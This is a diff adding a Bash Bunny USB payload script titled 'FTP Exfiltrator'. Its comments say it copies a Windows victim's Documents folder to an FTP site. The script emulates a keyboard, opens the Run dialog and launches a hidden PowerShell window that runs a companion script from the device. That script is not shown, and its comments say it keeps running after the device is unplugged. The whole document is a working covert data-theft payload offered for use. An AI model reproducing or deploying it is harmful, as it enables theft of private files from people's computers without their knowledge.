@@ -1,0 +1,26 @@
+#!/bin/bash
+#
+# Title:         FTP Exfiltrator
+# Author:        Nutt
+# Version:       1.0
+# Target:        Windows
+#
+#Exfiltrates files from the users Documents folder
+#FTP's all files/folders to a specified FTP site named by the victim hostname.
+#Powershell FTP script will stay running after BashBunny is unplugged, once light turns green unplug and check FTP site.
+
+#Executes 1.ps1
+
+#Purple.........Setup
+#Red............Failed - Need to work on
+#Green..........Finished
+
+LED SETUP
+GET SWITCH_POSITION
+ATTACKMODE HID STORAGE
+QUACK GUI r
+QUACK DELAY 1000
+LED ATTACK
+QUACK STRING powershell -windowstyle hidden ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\1.ps1')"
+QUACK ENTER
+LED FINISH
